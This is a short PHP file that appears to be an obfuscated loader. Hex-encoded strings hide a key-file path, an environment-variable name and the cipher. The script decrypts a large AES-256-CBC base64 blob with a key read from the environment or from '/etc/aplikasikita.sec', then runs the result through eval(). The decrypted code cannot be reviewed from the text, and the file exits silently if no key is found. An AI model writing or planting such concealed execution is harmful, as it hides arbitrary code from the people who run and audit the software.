<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('zlxskJ5Pg5gi5Ubfm9y24Q==');

$c=base64_decode(

'TeEyW2uReVdNXEDnWG9GRwEPdVzexmfaJAS+F0+IkjP3GBvL1nw9+XvEbtVSIa9uCoHLLEuyEJik' .
'fpGtA8ARM9ByQzO0k3zjmjQ380kGadfowWoXS4jUaulyMO5CslO0YSDcaG9DUyQUyomcZlhZXAh1' .
'a8/8qBSXJ9UQjmkcYaE5Yotrnpa0LofrvHxB4Bs5WBPTUBQof+aurgUKT6aeKvMKg6P8uHyYZPiv' .
'7vnE4cHCEPE3RdpyKt5SIXcsNbN4HuaXMBdVi3Tpod/q/ZoWSvRwn5XXrh46MrEyShQT0/aXQFGt' .
'UwtYwKmI6ovXVcYDgjljtR8eTUcJXmwCDgsQTTC+PvvEBSrTMQ1wi2R7ZqMoJaoSHgyMuVVxV/j8' .
'sFxyOjiDgizwiBuyMaHutVEeApkv1YwIhYWHE0a0v/V5Zym2ThGSy5ZgZkQ5Jyip99daMoIfg588' .
'EOE4i1PirsjXK+HjtJFYmJ3ixzvMGR4U2TDKD8i6tYaMrnC5TCFNIpj3IzPxuoT1+uEdlMrYTeGL' .
'YnOsDz7jyuWskOgsklAQPPa8pDY3WvLdknrhjKCV3fDnOkChcmwHilwnzTAfHQJHkI3N3D3q2La7' .
'za0GLABa5CuIUOf94qJMPxxYKYHF4IzxjGwcQfEbt18+6Db9lqovfXi6nyEvqOohaZrFGTutlKOb' .
'qbCbKMw71ZbCQVJII+8boNAedMftTLJ3WJnK6t0WNKWgiX17NiZD1zJdiDu9uKBL6oGTMmJnEec5' .
'//h83rHBABZqc0Xr+WiXkjg//aqtmVSR4WEK+QfKx/LEMDh2fUK5rgFdfaRTqBOc+q4ugRICZFRK' .
'gsaWwmelQAkiJhZmNeLd+3LjyN7QUmUuntz449lS7IluNuGeM5Vg1FH7tJybu3qpypUS8q3IN3sW' .
'RaZCH/fffK3Kna+rP52ToOdJTcbFv4x84hKsfMRmRugRDyG5dwVlG3733R5+VUeE/9YMrm0ys0hi' .
'ufFcgp7upyTPodqVBUYXOKngAnRNtffwZQ5TpPiYsIEmTmEyJQLdMb+cWfJ8FZaW/+imI3f4rkdI' .
'4RnwhOIdBZP5PxNS5ASfwokbToYpnZQVqmS2NRZ3z2Wd9f3hafaspRa/G6TgYI/unqDW5ROYFW8Z' .
'vSWfcVcYAltyPeAkLCG0i9Ad3T5IUlfwx71gQ71xauuK5IyQDkVHo7Mw1I4WrtXvtRDXfQ9Ndden' .
'uAWoi3XoiOJvHFmR+j8IctvLUOKv33XrL+m6hMKjaI8WPFRRh4RcY+GrRLC2JnNZoqLcymuqWLcW' .
'kGH+t3bkdxORwA8riHcf4snxPk5IJMr/toiSXYiLaSTzZdUQvXti2F6Vnsq3/3IfyabDILnSkQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

